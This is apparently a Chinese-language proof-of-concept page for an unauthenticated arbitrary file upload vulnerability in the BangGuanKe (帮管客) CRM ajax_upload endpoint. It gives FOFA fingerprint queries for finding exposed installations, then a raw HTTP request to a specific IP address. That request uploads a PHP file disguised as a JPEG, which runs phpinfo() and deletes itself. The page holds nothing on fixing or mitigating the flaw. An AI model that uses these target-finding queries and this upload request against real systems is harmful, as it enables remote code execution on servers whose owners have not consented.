# 帮管客 CRM ajax_upload文件上传漏洞

    ## fofa

```
(title="用户登录" && body="/themes/default/js/jquery.code.js") || header="Set-Cookie: bgk_session=a%3A5" || body="<p id=\"admintips\" >初始账号：admin" || banner="Set-Cookie: bgk_session=a%3A5"

product="帮管客-CRM"
```

## Poc

```null
POST /index.php/upload/ajax_upload HTTP/1.1
Host: 101.42.246.202:90
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv1WbOn5o
Accept-Encoding: gzip
Content-Length: 189

------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php
phpinfo();unlink(__FILE__);
------WebKitFormBoundaryv1WbOn5o--
```
